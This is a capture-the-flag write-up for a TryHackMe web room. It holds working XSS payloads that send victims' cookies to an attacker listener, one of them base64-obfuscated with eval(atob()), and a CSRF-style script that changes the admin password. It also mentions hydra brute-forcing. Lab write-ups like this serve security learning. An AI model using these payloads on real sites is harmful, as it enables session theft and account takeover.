# 1) Summary
- link : https://tryhackme.com/room/whatsyourname
- skills required: XSS, CSRF, cyberchef, enumerations

# 2) Write-up to get the flag.
- started with nmap for ports discovery. Ports opened for business were 22, 80, 8081.
  <img width="549" height="226" alt="Screenshot from 2025-09-29 18-15-29" src="https://github.com/user-attachments/assets/ad54f7ec-18a5-42d9-a807-e68823b08f3e" />
- Further enumeration was done to find more details on specific ports. Attention was required on httponly flag not set. 
  <img width="760" height="586" alt="image" src="https://github.com/user-attachments/assets/e8226648-383e-44ea-ade9-8cbb6b6e7ab0" />
- It was further confirmed: HttpOnly = false via inspecting cookies in the browser.
- In the registration page, the hint is "Your details will be reviewed by the site moderator". Since HttpOnly = false, if I can find an entry point for XSS I can use the point to steal cookie from another active login session.

### What is the HttpOnly Flag?
The HttpOnly flag is a security attribute set by the server when it sends a cookie to your browser. Its primary purpose is to mitigate the risk of client-side scripts accessing protected cookies.
- How it Works: When a cookie is set with the HttpOnly flag, the browser prevents client-side scripts (like JavaScript) from reading or modifying it through the document.cookie API.
- Its Purpose: It is a critical defense against Cross-Site Scripting (XSS) attacks. Even if an attacker successfully executes malicious JavaScript on a page, they cannot directly steal an HttpOnly cookie

### brute force password.
It also also found that 'moderator' is an existing username. So I proceed to use hydra to brute force password althought at the end it was not successfuly (I stopped it after I gained the access as the moderator).
<img width="1356" height="709" alt="Screenshot from 2025-09-29 20-46-16" src="https://github.com/user-attachments/assets/405b17da-5421-47f4-a2c1-78213e719f1f" />

### back to XSS to exploit HttpOnly=false
- the payload used was `<img src=x onerror="new Image().src='http://10.11.139.184:4444/?='+document.cookie;">`
- It was found the the length was too long for the username field and email field. Luckly it was ok for the name field:
- <img width="1356" height="709" alt="Screenshot from 2025-09-29 20-51-44" src="https://github.com/user-attachments/assets/87d09e4f-c5ce-45ed-bfb9-08dbe51fedbe" />
- I thought it didn't work. It took the moderator more than 30sec to steal the cookie
- <img width="1916" height="940" alt="Screenshot from 2025-09-29 20-54-29" src="https://github.com/user-attachments/assets/aa6e69a9-5f21-4db2-9454-535e2e0638a0" />
- Then I would need to visit login.worldwap.thm to login once registration was successful. it was a blank page. By inspecting the code I believe the landing page should be login.php.
- <img width="1366" height="747" alt="Screenshot from 2025-09-29 20-56-48" src="https://github.com/user-attachments/assets/b1c9b7a3-cbf3-4c3e-ad69-7ac3a1c41e14" />
- <img width="1360" height="869" alt="image" src="https://github.com/user-attachments/assets/18b50881-f251-4ff8-b4ab-baf11bf3081f" />
- login successfully and got the first flag (put the cookie there and refresh the browser).
- <img width="1360" height="869" alt="image" src="https://github.com/user-attachments/assets/746c6906-2035-4183-90c3-602285bf55aa" />
- In http://login.worldwap.thm/profile.php, there weren't many place for testing XSS. It was obvious the chatbot was where the script needed to go.
- <img width="1360" height="869" alt="image" src="https://github.com/user-attachments/assets/ea47b222-ac01-4c1c-8d0d-ca101e66ffda" />
- Payload `<img src=x onerror="new Image().src='http://10.11.139.184:4445/?='+document.cookie;">` was tried but didn't work.
- Then diffenerent encoding methods were tried and base64 worked. The new payload was `<img src=x onerror="eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTAuMTEuMTM5LjE4NDo0NDQ1Lz89Jytkb2N1bWVudC5jb29raWU7'))">`
- <img width="1910" height="967" alt="Screenshot from 2025-09-29 21-36-32" src="https://github.com/user-attachments/assets/25a13d56-f6d1-4890-b589-2bd62751f658" />
- It worked and admin flag retrieved - logout, and log back in by copied & pasted the new admin cookie to the login page.
- <img width="1910" height="967" alt="image" src="https://github.com/user-attachments/assets/75d68e1d-fad7-4706-8a65-47108ead3a90" />

### Another way to get the flag
- another way to get the flag could be having a paylaod to change the password directly - CSRF. Going back and login as the moderator and go to the chat.
- I would like to create a XmlHttpRequest(). First let me get burp going to see how the password change request was done. Also had the proxy set and visited the change password page.
- <img width="1910" height="967" alt="Screenshot from 2025-09-29 21-45-37" src="https://github.com/user-attachments/assets/be6c9fe8-ad77-4fe4-b773-491b90b6e525" />
- the parameter was new_password=test.
- The payload would be similiar to the one in https://tryhackme.com/room/csrfV2 task 7. This was the origianl payload in that room.
- ```javascript
  <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://mybank.thm/updatepassword', true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&parameter=value');
    </script>
  ```
- It was only the target URL need to be changed and base64 encoded, and also the parameter need to be changed. Why base64 encoding was required? I learned that from trial and error when I stole the cookie.
- To encode 'http://login.worldwap.thm/change_password.php' to base64, it could be done in cyberchef
- <img width="1577" height="514" alt="Screenshot from 2025-09-29 21-58-30" src="https://github.com/user-attachments/assets/7569faed-cb6a-4f05-8130-b52433e8900f" />
- so the final payload was:
- ```javascript
  <script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', atob("aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw"), true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&new_password=test');
    </script>
  ```
- finally, logout, and login again using username 'admin' and password 'test'. Got the same flag.
- <img width="1599" height="833" alt="Screenshot from 2025-09-29 22-01-17" src="https://github.com/user-attachments/assets/c99d63e1-feb3-4aa2-994e-f52e93eabc1a" />











  
